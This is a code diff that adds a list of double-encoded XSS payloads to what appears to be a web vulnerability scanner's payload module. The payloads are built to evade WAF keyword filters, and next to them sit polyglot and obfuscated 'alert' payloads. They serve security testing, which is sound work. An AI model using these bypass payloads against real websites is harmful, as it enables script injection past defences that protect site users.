@@ -117,6 +117,17 @@ POLYGLOT = [
     "`-alert`{marker}`-`<svg onload=alert`{marker}`>",
 ]
 
+# Payloads for WAFs that inspect the raw URL before decoding (double-encode bypass).
+# These avoid onerror/onload/script which are commonly keyword-blocked.
+# The _double_url_encode transform will encode < and > as %253c/%253e.
+WAF_BYPASS_DOUBLE_ENCODE = [
+    "<img src=x onfocus=alert('{marker}') autofocus>",
+    "<details open ontoggle=alert('{marker}')>",
+    "<input autofocus onfocus=alert('{marker}')>",
+    "<svg onmouseover=alert('{marker}')>hover</svg>",
+    "<body onpageshow=alert('{marker}')>",
+]
+
 # WAF bypass via global object obfuscation
 WAF_BYPASS_GLOBAL = [
     "<img src=x onerror=\"self['ale'+'rt']('{marker}')\">",
